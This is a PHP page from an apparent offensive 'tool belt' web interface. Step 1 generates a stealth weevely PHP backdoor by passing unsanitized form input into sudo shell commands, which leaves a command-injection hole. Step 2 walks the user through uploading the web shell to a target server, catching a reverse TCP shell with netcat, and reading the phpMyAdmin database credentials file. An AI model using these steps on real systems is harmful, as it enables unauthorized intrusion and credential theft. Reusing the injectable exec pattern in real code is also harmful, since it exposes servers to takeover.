<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Orion's Tool Belt</h4>
		
		
		
		
		<div class="clear"></div>
		
		<article class="module width_full">
			<header><h3><label>STEP 1:</label><b>Generate the php stealth backdoor</b></h3></header>
				<div class="module_content">
<form name="form1" action="" method="post">
    
						<fieldset>
							<label>Name of the backdoor</label>
                                                        <input type="text" name="name" id="ur" value="yourshell.php ">
                                                        
						</fieldset>
    <fieldset>
							<label>Enter password to use</label>
                                                        <input type="text" name="pass" id="ur" value="pentest">
                                                        
						</fieldset>
    <?php
    if(isset($_POST['submit'])){
        $name=$_POST['name'];
        $pass=$_POST['pass'];
        echo ' <div  id="dvProgress" runat="server">
        Please Wait ...<img src="veeru.gif" style="vertical-align: middle" alt="Processing" />
    </div> ';
        echo "<fieldset><label>Your Backdoor</label><br/>";
?><v id="dvprogress">
<?php
 echo '<p>Gnerating PHP Backdoor using weevely...</p>';
 shell("weevely generate $pass $name");
 exec("sudo mv $name exploits/$name");
 exec("sudo zip exploits/php.zip exploits/$name");
 echo '<p>Available for download in zip @  --><a href=exploits/php.zip>Click here</a></p>';
        echo '</fieldset>';
    }
    ?>
</v>
        	
						<div class="clear"></div>
				</div>
			<footer>
				<div class="submit_link">
					
                                    <input type="submit" name="submit" value="Generate" class="alt_btn" id="submit">
                                   <input type="reset" value="Reset" >
				</div>
			</footer>
		</article><!-- end of post new article -->
                
             <article class="module width_full">
			<header><h3><label>STEP 2:</label><b>Upload and start connection</b></h3></header>
				<div class="module_content">
<form name="form1" action="" method="post">
    <fieldset>
        <label>Step 2a.</label> Upload this PHP stealth web shell and backdoor to target web server (that supports php)
    </fieldset>
     <fieldset>
         <label>Step 2b.</label>Suppose u’ve successfully uploaded the PHP backdoor with the address <b>http://192.168.2.29/upload/yourshell.php</b>
         where upload is the directory on the server where you uploaded your shell.<?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open Terminal  <a target='_blank' href='https://$host:4200/'>here</a></p>";?>

     </fieldset>
    <fieldset>
        <label>Step 2c.</label><b>Type in console:  </b>
        <code>weevely http://192.168.2.29/upload/yourshell.php pentest</code>
    </fieldset>
    
    <fieldset>
        <label>Step 2d.</label><b>www-data@192.168.2.29-->  </b>
        <code>:shell.sh ls</code><p>
        <b>Format -></b> :shell.sh (system_command)</p>
    </fieldset>
        <fieldset>
            <label>Step 2e.</label>Use NetCat to listen for an incoming connection in your attacker computer
            <?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open <a target='_blank' href='https://$host:4200/'>Terminal </a>and type:<code>  nc -l -v -p 23</code></p>";?>
    </fieldset>
    <fieldset>
        <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now  make a reverse TCP connection to our computer. 
       <p><b>Type--></b> <code>:backdoor.reverse_tcp your_ip 23</code></p>
    </fieldset>
    <fieldset>
        <label>Step 2g.</label>If remote  server is a web server with MySQL database and PHPMyadmin installed.Try this in your 'netcat' terminal opened in <b>step 2E</b>
        <code>cat /etc/phpmyadmin/config-db.php</code>
    </fieldset>
     <fieldset>
         <label>Note:</label> In terminal type <b>weevely help</b>
    </fieldset>
        
    
						<div class="clear"></div>
				</div>
			<footer>
				
			</footer>
		</article><!-- end of post new article -->
                

		
		

		<div class="spacer"></div>
	</section>
</body>
</html>
